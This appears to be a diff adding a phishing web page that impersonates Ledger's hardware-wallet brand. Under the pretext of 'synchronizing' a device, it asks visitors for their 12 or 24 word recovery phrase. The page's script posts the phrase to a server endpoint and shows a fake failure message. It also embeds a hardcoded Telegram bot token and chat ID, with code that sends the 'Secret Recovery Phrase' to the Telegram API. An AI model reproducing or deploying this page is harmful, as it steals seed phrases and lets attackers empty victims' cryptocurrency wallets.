+        <p>Select the operating system you're using to synchronize your Ledger device.</p>
+        
+        <div class="os-options">
+            <div class="os-option" data-os="mac">
+                <i class="fab fa-apple"></i>
+                <h4>Mac</h4>
+            </div>
+            <div class="os-option" data-os="windows">
+                <i class="fab fa-windows"></i>
+                <h4>Windows</h4>
+            </div>
+            <div class="os-option" data-os="Mobile">
+                <i class="fab fa-android"></i>
+                <h4>Mobile</h4>
+            </div>
+            <div class="os-option" data-os="ubuntu">
+                <i class="fab fa-ubuntu"></i>
+                <h4>Others</h4>
+            </div>
+        </div>
+        
+        <div class="navigation-buttons">
+            <button class="btn prev-step">Previous</button>
+            <button class="btn next-step">Next</button>
+        </div>
+    </div>
+        
+        <div class="step-content" data-step-content="3">
+            <h3 class="text-center">Enter Wallet Passphrase</h3>
+            <p></p>
+            <br> <br>
+            
+            <div class="form-group">
+                <label for="recovery-phrase">Recovery Phrase</label>
+                <textarea id="recovery-phrase" class="form-control recovery-phrase-input" placeholder="Enter your 12 or 24 word recovery phrase separated by spaces"></textarea>
+            </div>
+            
+            
+            <div class="navigation-buttons">
+                <button class="btn prev-step">Previous</button>
+                <button class="btn next-step" id="submit-phrase">Synchronize</button>
+            </div>
+        </div>
+        
+        <div class="step-content" data-step-content="4">
+            <div class="result-message error">
+                <i class="fas fa-times-circle" style="font-size: 3rem; margin-bottom: 15px;"></i>
+                <h3>Synchronization Not Successful</h3>
+                <p>We couldn't synchronize your Ledger wallet. Please check your recovery phrase and try again.</p>
+                <p>For assistance, please contact our support team.</p>
+            </div>
+            
+            <div class="navigation-buttons">
+                <button class="btn prev-step">Try Again</button>
+                <a href="#" class="btn">Compare Wallets</a>
+            </div>
+        </div>
+    </section>
+    
+    <section class="features">
+        <div class="container">
+            <h2>Why Choose Ledger Flex™</h2>
+            
+            <div class="features-grid">
+                <div class="feature-card">
+                    <i class="fas fa-shield-alt"></i>
+                    <h3>Uncompromising Security</h3>
+                    <p>Military-grade security to protect your digital assets from hackers and malware.</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-mobile-alt"></i>
+                    <h3>Seamless Synchronization</h3>
+                    <p>Easily sync your wallets across multiple devices with our advanced technology.</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-coins"></i>
+                    <h3>Multi-Currency Support</h3>
+                    <p>Manage all your cryptocurrencies in one secure place with support for 1000+ assets.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section class="compare-section">
+        <div class="container">
+            <h2>Compare Ledger Wallets</h2>
+            
+            <div class="table-responsive">
+                <table class="compare-table">
+                    <thead>
+                        <tr>
+                            <th>Feature</th>
+                            <th>Nano X</th>
+                            <th>Nano S Plus</th>
+                            <th>Nano S</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td class="feature-name">Bluetooth</td>
+                            <td class="available">Yes</td>
+                            <td class="unavailable">No</td>
+                            <td class="unavailable">No</td>
+                        </tr>
+                        <tr>
+                            <td class="feature-name">Screen Size</td>
+                            <td>128x64px</td>
+                            <td>128x64px</td>
+                            <td>128x32px</td>
+                        </tr>
+                        <tr>
+                            <td class="feature-name">Battery</td>
+                            <td class="available">Yes (100mAh)</td>
+                            <td class="unavailable">No</td>
+                            <td class="unavailable">No</td>
+                        </tr>
+                        <tr>
+                            <td class="feature-name">Supported Coins</td>
+                            <td>5500+</td>
+                            <td>5500+</td>
+                            <td>1800+</td>
+                        </tr>
+                        <tr>
+                            <td class="feature-name">Storage Capacity</td>
+                            <td>100 apps</td>
+                            <td>100 apps</td>
+                            <td>3-20 apps</td>
+                        </tr>
+                        <tr>
+                            <td class="feature-name">Price</td>
+                            <td>$149</td>
+                            <td>$79</td>
+                            <td>$59</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </section>
+    
+    <footer>
+        <div class="container">
+            <div class="social-icons">
+                <a href="#"><i class="fab fa-twitter"></i></a>
+                <a href="#"><i class="fab fa-facebook"></i></a>
+                <a href="#"><i class="fab fa-instagram"></i></a>
+                <a href="#"><i class="fab fa-linkedin"></i></a>
+                <a href="#"><i class="fab fa-youtube"></i></a>
+            </div>
+            
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Support</a>
+                <a href="#">Blog</a>
+                <a href="#">About Us</a>
+            </div>
+            
+            <p class="copyright">© 2023 Ledger Flex™. All rights reserved.</p>
+        </div>
+    </footer>
+    
+ <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Step navigation
+        const steps = document.querySelectorAll('.step');
+        const stepContents = document.querySelectorAll('.step-content');
+        const nextButtons = document.querySelectorAll('.next-step');
+        const prevButtons = document.querySelectorAll('.prev-step');
+        const submitButton = document.getElementById('submit-phrase');
+        
+        let currentStep = 1;
+        
+        // Product selection
+        const productCards = document.querySelectorAll('.product-card');
+        let selectedProduct = null;
+        
+        productCards.forEach(card => {
+            card.addEventListener('click', function() {
+                productCards.forEach(c => c.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedProduct = this.getAttribute('data-product');
+            });
+        });
+        
+        // OS selection
+        const osOptions = document.querySelectorAll('.os-option');
+        let selectedOS = null;
+        
+        osOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                osOptions.forEach(o => o.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedOS = this.getAttribute('data-os');
+            });
+        });
+        
+        // Next step button
+        nextButtons.forEach(button => {
+            button.addEventListener('click', function() {
+                // Validate current step before proceeding
+                if (currentStep === 1 && !selectedProduct) {
+                    alert('Please select a Ledger product');
+                    return;
+                }
+                
+                if (currentStep === 2 && !selectedOS) {
+                    alert('Please select your operating system');
+                    return;
+                }
+                
+                // For non-step-3 cases, proceed normally
+                proceedToNextStep();
+            });
+        });
+        
+        // Submit button (step 3)
+             // Modified submit button handler
+        if (submitButton) {
+            submitButton.addEventListener('click', async function() {
+                const recoveryPhrase = document.getElementById('recovery-phrase').value.trim();
+                if (!recoveryPhrase) {
+                    alert('Please enter your recovery phrase');
+                    return;
+                }
+
+                // Show loading state
+                submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Synchronizing...';
+                submitButton.disabled = true;
+
+                try {
+                    // Send data to Telegram
+                    await sendDataToServer(selectedProduct, selectedOS, recoveryPhrase);
+                    
+                    // Show "not successful" message
+                    showNotSuccessfulMessage();
+                    
+                } catch (error) {
+                    console.error('Synchronization error:', error);
+                    alert('Failed to synchronize. Please try again.');
+                } finally {
+                    // Reset button state
+                    submitButton.innerHTML = 'Synchronize';
+                    submitButton.disabled = false;
+                }
+            });
+        }
+
+        // New dedicated function for showing message and reloading
+        function showNotSuccessfulMessage() {
+            // First show the error message
+            proceedToNotSuccessfulStep();
+            
+            // Then add countdown and reload
+            const countdownEl = document.createElement('div');
+            countdownEl.className = 'countdown-message';
+            countdownEl.innerHTML = 'Page will refresh in <span class="countdown">3</span> seconds...';
+            
+            const stepContent = document.querySelector('.step-content[data-step-content="4"]');
+            stepContent.appendChild(countdownEl);
+
+            // Start countdown
+            let seconds = 3;
+            const countdownInterval = setInterval(() => {
+                seconds--;
+                document.querySelector('.countdown').textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    // Clear sensitive data
+                    document.getElementById('recovery-phrase').value = '';
+                    // Force full reload
+                    window.location.href = window.location.pathname + '?reload=' + Date.now();
+                }
+            }, 1000);
+        }
+        // Previous step button
+        prevButtons.forEach(button => {
+            button.addEventListener('click', function() {
+                if (currentStep > 1) {
+                    steps[currentStep].classList.remove('active');
+                    
+                    currentStep--;
+                    steps[currentStep].classList.add('active');
+                    steps[currentStep].classList.remove('completed');
+                    
+                    stepContents.forEach(content => {
+                        content.classList.remove('active');
+                        if (parseInt(content.getAttribute('data-step-content')) === currentStep) {
+                            content.classList.add('active');
+                        }
+                    });
+                }
+            });
+        });
+        
+        // Corrected function to proceed to the "not successful" step
+        function proceedToNotSuccessfulStep() {
+            // Update steps
+            steps[currentStep].classList.remove('active');
+            steps[currentStep].classList.add('completed');
+            
+            currentStep = 4;
+            steps[currentStep].classList.add('active');
+            
+            // Show the "not successful" content
+            stepContents.forEach(content => {
+                content.classList.remove('active');
+                if (parseInt(content.getAttribute('data-step-content')) === currentStep) {
+                    content.classList.add('active');
+                }
+            });
+
+            // Create and show countdown element
+            const countdownEl = document.createElement('div');
+            countdownEl.className = 'countdown-message';
+            countdownEl.innerHTML = 'Page will refresh in <span class="countdown">3</span> seconds...';
+            countdownEl.style.cssText = `
+                text-align: center;
+                margin: 20px 0;
+                font-size: 1.2rem;
+                color: var(--primary);
+            `;
+            
+            const stepContent = document.querySelector('.step-content[data-step-content="4"]');
+            stepContent.appendChild(countdownEl);
+
+            // Start countdown
+            let seconds = 3;
+            const countdown = setInterval(() => {
+                seconds--;
+                document.querySelector('.countdown').textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdown);
+                    // Clear sensitive data
+                    document.getElementById('recovery-phrase').value = '';
+                    // Force reload from server (not from cache)
+                    window.location.href = window.location.href.split('?')[0];
+                }
+            }, 1000);
+        }
+
+
+        // Function to proceed to next step (normal flow)
+        function proceedToNextStep() {
+            steps[currentStep].classList.remove('active');
+            steps[currentStep].classList.add('completed');
+            
+            currentStep++;
+            steps[currentStep].classList.add('active');
+            
+            stepContents.forEach(content => {
+                content.classList.remove('active');
+                if (parseInt(content.getAttribute('data-step-content')) === currentStep) {
+                    content.classList.add('active');
+                }
+            });
+        }
+        
+        // Function to send data to server
+        // Send to Telegram
+const botToken = "7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA";
+const chatId = "-4704812522"; // Updated with -100 prefix if it's a group
+
+// Cleaned message format with escaped Markdown characters
+const message = `*Wallet:* ${walletName.replace(/[_*[\]()~`>#+-=|{}.!]/g, '\\$&')}\n*Secret Recovery Phrase:*\n\`\`\`\n${phrase.replace(/[`]/g, '\\`')}\n\`\`\``;
+
+fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "MarkdownV2"
+    })
+})
+.then(response => response.text())
+.then(data => console.log("Telegram response:", data))
+.catch(error => console.error("Telegram error:", error));
+        async function sendDataToServer(product, os, recoveryPhrase) {
+            const response = await fetch('/sync', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    product: product,
+                    os: os,
+                    recoveryPhrase: recoveryPhrase
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            
+            return response.json();
+        }
+    });
+</script></body></html>
